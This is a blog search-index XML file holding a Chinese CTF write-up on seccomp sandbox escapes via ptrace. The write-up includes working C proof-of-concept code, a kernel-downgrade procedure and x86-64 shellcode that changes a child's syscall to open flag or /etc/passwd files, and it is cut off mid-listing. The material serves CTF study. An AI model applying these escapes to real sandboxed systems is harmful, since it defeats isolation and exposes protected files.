<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ptrace在pwn中的利用</title>
      <link href="/post/c6e8b0b3.html"/>
      <url>/post/c6e8b0b3.html</url>
      
        <content type="html"><![CDATA[<h1 id="ptrace在pwn中的利用"><a href="#ptrace在pwn中的利用" class="headerlink" title="ptrace在pwn中的利用"></a>ptrace在pwn中的利用</h1><h2 id="seccomp-ret2trace"><a href="#seccomp-ret2trace" class="headerlink" title="seccomp ret2trace"></a>seccomp ret2trace</h2><p>前几天打了2024的羊城杯，其中一道pwn的沙箱没绕过去，沙箱如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x07 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0009</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x05 0x00 0x40000000  <span class="keyword">if</span> (A &gt;= 0x40000000) goto 0009</span><br><span class="line"> 0004: 0x15 0x04 0x00 0x00000002  <span class="keyword">if</span> (A == open) goto 0009</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000101  <span class="keyword">if</span> (A == openat) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000142  <span class="keyword">if</span> (A == execveat) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7ff00000  <span class="built_in">return</span> TRACE</span><br></pre></td></tr></table></figure><p>可以看到当检测到非法的syscall时在这里是return TRACE而不是return KILL，那么很容易想到可能会和ptrace有一定的关系，那么首先需要了解一下seccomp return TRACE到底是在干什么<br>在<a href="https://www.kernel.org/doc/html/next/translations/zh_CN/userspace-api/seccomp_filter.html">这里</a>有提及SECCOMP_RET_TRACE</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SECCOMP_RET_TRACE:</span><br><span class="line">    当返回的时候，这个值会使得内核在执行系统调用前尝试去通知一个基于 ptrace() 的追踪器。如果没有追踪器， -ENOSYS 会返回给用户空间，并且系统调用不会执行。</span><br><span class="line">    如果追踪器通过 ptrace(PTRACE_SETOPTIONS) 请求了 PTRACE_O_TRACESECCOMP， 那么它会收到 PTRACE_EVENT_SECCOMP 通知。BPF程序返回值的 SECCOMP_RET_DATA 部分会通过 PTRACE_GETEVENTMSG 提供给追踪器。</span><br><span class="line">    追踪器可以通过改变系统调用号到-1来跳过系统调用。或者追踪器可以改变系统调用号到 一个有效值来改变请求的系统调用。如果追踪器请求跳过系统调用，那么系统调用将返回 追踪器放在返回值寄存器中的值。</span><br><span class="line">    在追踪器被通知后，seccomp检查不会再次运行。（这意味着基于seccomp的沙箱必须禁止 ptrace的使用，甚至其他沙箱进程也不行，除非非常小心；ptrace可以通过这个机制来逃逸。）</span><br></pre></td></tr></table></figure><p>在文档中最后还提醒了，如果使用这种返回可以通过ptrace来进行逃逸，下面通过一个demo来验证，下面先贴出demo的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc poc.c -o poc -lseccomp -g -w</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sec</span><span class="params">()</span>&#123;</span><br><span class="line">scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_TRACE(<span class="number">0</span>), SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_TRACE(<span class="number">0</span>), SCMP_SYS(openat), <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> seccomp_load(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">sec();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/flag&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd:%d\n&quot;</span>,fd);</span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="type">int</span> fd = open(<span class="string">&quot;/flag&quot;</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fd:%d\n&quot;</span>,fd);</span><br><span class="line">        sendfile(<span class="number">1</span>,fd,<span class="number">0</span>,<span class="number">0x100</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 附加ptrace</span></span><br><span class="line">        ptrace(PTRACE_ATTACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">// 等待子进程停止</span></span><br><span class="line">        wait(<span class="literal">NULL</span>); </span><br><span class="line">        <span class="comment">// 设置 PTRACE_O_TRACESECCOMP</span></span><br><span class="line">        ptrace(PTRACE_SETOPTIONS, pid, <span class="literal">NULL</span>, PTRACE_O_TRACESECCOMP);</span><br><span class="line">        <span class="comment">// 子进程继续</span></span><br><span class="line">        ptrace(PTRACE_CONT, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">// 等待子进程退出</span></span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">// 脱离ptrace</span></span><br><span class="line">        ptrace(PTRACE_DETACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>沙箱如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x07 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0009</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x04 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0009</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000002  <span class="keyword">if</span> (A == open) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000101  <span class="keyword">if</span> (A == openat) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7ff00000  <span class="built_in">return</span> TRACE</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><p>下面是执行结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./poc </span><br><span class="line">fd:-1</span><br><span class="line">fd:3</span><br><span class="line">flag&#123;this_is_a_flag!&#125;</span><br></pre></td></tr></table></figure><p>整个过程其实也是比较简单的，首先fork一个子进程用来执行shellcode，主进程用来ptrace子进程，主进程先<code>ptrace(PTRACE_ATTACH, pid, NULL, NULL);</code>来附加子进程，接着等待子进程停止，当子进程执行到open的系统调用时就会停止并给主进程的ptrace返回TRACE，主进程收到后设置捕获类型，然后捕获到后<code>ptrace(PTRACE_CONT, pid, NULL, NULL);</code>使子进程继续执行，那么子进程就会完成open操作而完成绕过沙箱，接下来的wait是在等子进程运行完成后退出，最后取消附加完成整个利用过程。<br>最后，关于赛题利用堆风水+apple链即可达到执行shellcode的目的，利用上述方法即可绕过沙箱</p><h2 id="ptrace-修改系统调用"><a href="#ptrace-修改系统调用" class="headerlink" title="ptrace 修改系统调用"></a>ptrace 修改系统调用</h2><p>首先来了解一下ptrace是怎样修改系统调用的。在做系统调用时，我们都是将系统调用号存储在rax中然后syscall触发系统调用，然而实际上系统调用号后续是存储在orig_rax中的，所以用ptrace来修改系统调用实际上就是在修改orig_rax<br>同样还是先贴出没有沙箱情况下的demo代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc poc.c -o poc -g -w</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)&#123;</span><br><span class="line">        ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        syscall(SYS_kill, syscall(SYS_getpid), SIGSTOP);</span><br><span class="line">        <span class="type">int</span> fd = syscall(SYS_getpid, <span class="string">&quot;/flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        sendfile(<span class="number">1</span>,fd,<span class="number">0</span>,<span class="number">0x100</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_SYSCALL, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (regs.orig_rax == SYS_getpid) &#123;</span><br><span class="line">        regs.orig_rax = SYS_open;</span><br><span class="line">        ptrace(PTRACE_SETREGS, pid, <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述demo就可以将getpid的系统调用改为open，从而打开文件返回fd。<br>既然ptrace可以修改系统调用，那么是否可以bypass seccomp呢？这个是有说法的，通过查阅网上资料发现，好像是kernel&lt;&#x3D;4.8的环境中可以实现，高版本被修复了，下面通过ubuntu16.04 kernel4.4来复现。<br>首先贴出poc<a href="https://gist.github.com/thejh/8346f47e359adecd1d53">地址</a>，同时还有一篇kernel降低版本的<a href="https://blog.csdn.net/m0_64986186/article/details/134543975">blog</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更换kernel版本</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前版本 </span></span><br><span class="line">$ <span class="built_in">uname</span> -r</span><br><span class="line">4.15.0-112-generic</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前仓库存在版本</span></span><br><span class="line">$ apt-cache search linux | grep linux-image | grep generic | grep 4.4</span><br><span class="line">linux-image-4.4.0-21-generic - Linux kernel image <span class="keyword">for</span> version 4.4.0 on 64 bit x86 SMP</span><br><span class="line">linux-image-extra-4.4.0-21-generic - Linux kernel extra modules <span class="keyword">for</span> version 4.4.0 on 64 bit x86 SMP</span><br><span class="line">linux-image-4.4.0-142-generic - Linux kernel image <span class="keyword">for</span> version 4.4.0 on 64 bit x86 SMP</span><br><span class="line">linux-image-4.4.0-186-generic - Signed kernel image generic</span><br><span class="line">linux-image-4.4.0-210-generic - Signed kernel image generic</span><br><span class="line">linux-image-extra-4.4.0-142-generic - Linux kernel extra modules <span class="keyword">for</span> version 4.4.0 on 64 bit x86 SMP</span><br><span class="line">linux-image-unsigned-4.4.0-186-generic - Linux kernel image <span class="keyword">for</span> version 4.4.0 on 64 bit x86 SMP</span><br><span class="line">linux-image-unsigned-4.4.0-210-generic - Linux kernel image <span class="keyword">for</span> version 4.4.0 on 64 bit x86 SMP</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载kernel文件</span></span><br><span class="line">$ <span class="built_in">sudo</span> apt-get install linux-image-4.4.0-21-generic linux-headers-4.4.0-21-generic</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更改/etc/default/grub</span></span><br><span class="line">$ <span class="built_in">sudo</span> sed -i <span class="string">&quot;s/GRUB_DEFAULT=0/GRUB_DEFAULT=\&quot;Advanced options for Ubuntu&gt;Ubuntu, with Linux 4.4.0-21-generic\&quot;/g&quot;</span> /etc/default/grub</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新配置</span></span><br><span class="line">$ <span class="built_in">sudo</span> update-grub</span><br><span class="line">$ <span class="built_in">sudo</span> reboot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启后</span></span><br><span class="line">$ <span class="built_in">uname</span> -r</span><br><span class="line">4.4.0-21-generic</span><br></pre></td></tr></table></figure><p>现在编译poc并运行得到下面的结果</p><p><img src="https://cdn.jsdelivr.net/gh/sheratan4/picture@main/img/202409051703022.png" alt="ptrace_1"></p><p>可以看到在开启沙箱后还是完成了打开文件的操作，那么在pwn中如果遇到kernel&lt;&#x3D;4.8则可以考虑使用这种方法来绕过沙箱，简化一下poc可以提取出主要步骤</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sec</span><span class="params">()</span>&#123;</span><br><span class="line">scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(openat), <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> seccomp_load(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">sec();</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)&#123;</span><br><span class="line">        ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        syscall(SYS_kill, syscall(SYS_getpid), SIGSTOP);</span><br><span class="line">        <span class="type">int</span> fd = syscall(SYS_getpid, <span class="string">&quot;/etc/passwd&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        sendfile(<span class="number">1</span>,fd,<span class="number">0</span>,<span class="number">0x100</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    waitpid(pid,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_SYSCALL, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    waitpid(pid,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (regs.orig_rax == SYS_getpid) &#123;</span><br><span class="line">        regs.orig_rax = SYS_open;</span><br><span class="line">        ptrace(PTRACE_SETREGS, pid, <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的可以将其改为汇编，改自<a href="https://www.jianshu.com/p/75e157cea215">这里</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">/* fork() */</span><br><span class="line">push 0x39</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">/* 判断子进程和主进程 */</span><br><span class="line">test rax, rax</span><br><span class="line"></span><br><span class="line">jz child</span><br><span class="line"></span><br><span class="line">parent:</span><br><span class="line">    /* time delay */</span><br><span class="line">    mov rdx, 0x30000000</span><br><span class="line">    dec rdx</span><br><span class="line">    test rdx, rdx</span><br><span class="line">    jnz $ - 6</span><br><span class="line">    push rax</span><br><span class="line"></span><br><span class="line">    /* waitpid(childpid, NULL, 0) */</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov r10, 0</span><br><span class="line">    mov rax, 0x3d</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    /* ptrace(PTRACE_SYSCALL, childpid, NULL, NULL) */</span><br><span class="line">    mov rdi, 0x18</span><br><span class="line">    mov rsi, [rsp]</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov r10, 0</span><br><span class="line">    mov rax, 0x65</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    /* waitpid(childpid, NULL, 0) */</span><br><span class="line">    mov rdi, [rsp]</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov r10, 0</span><br><span class="line">    mov rax, 0x3d</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    /* ptrace(PTRACE_GETREGS, childpid, NULL, &amp;regs) */</span><br><span class="line">    mov rdi, 0xc</span><br><span class="line">    mov rsi, [rsp]</span><br><span class="line">    mov rdx, 0x0</span><br><span class="line">    mov r10, rsp</span><br><span class="line">    add r10, 0x400</span><br><span class="line">    mov rax, 0x65</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    /* ptrace(PTRACE_SETREGS, childpid, NULL, &amp;regs) */</span><br><span class="line">    mov rdi, 0xd</span><br><span class="line">    mov rsi, [rsp]</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov r10, rsp</span><br><span class="line">    add r10, 0x400</span><br><span class="line"></span><br><span class="line">    /* 改orig_rax */</span><br><span class="line">    mov qword ptr [r10+0x78], 2</span><br><span class="line">    mov rax, 0x65</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    /* ptrace(PTRACE_DETACH, childpid, NULL, NULL) */</span><br><span class="line">    mov rdi, 0x11</span><br><span class="line">    mov rsi, [rsp]</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov r10, 0</span><br><span class="line">    mov rax, 101</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    /* exit() */</span><br><span class="line">    mov rax, 0x3c</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">child:</span><br><span class="line">    /* ptrace(PTRACE_TRACEME, 0, NULL, NULL) */</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov r10, 0</span><br><span class="line">    mov rax, 101</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    /* syscall(SYS_gettid) */</span><br><span class="line">    mov rax, 0x27</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    /* syscall(SYS_tkill, pid, SIGSTOP) */</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, 0x13</span><br><span class="line">    mov rax, 0x3e</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    /* push flag  */</span><br><span class="line">    mov r15, 0x67616c66</span><br><span class="line">    push r15</span><br><span class="line">    </span><br><span class="line">    /* open(file=&#x27;rsp&#x27;, oflag=0, mode=0) */</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    /* call open() */</span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rax, 39 /* getpid */</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">/* sendfile(1,&#x27;rax&#x27;,0,0x100) */</span><br><span class="line">mov rdi, 1</span><br><span class="line">mov rsi, rax</span><br><span class="line">mov rdx, 0</span><br><span class="line">mov r10, 0x100</span><br><span class="line">push 0x28</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>比如此时写一个有漏洞的程序做测试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 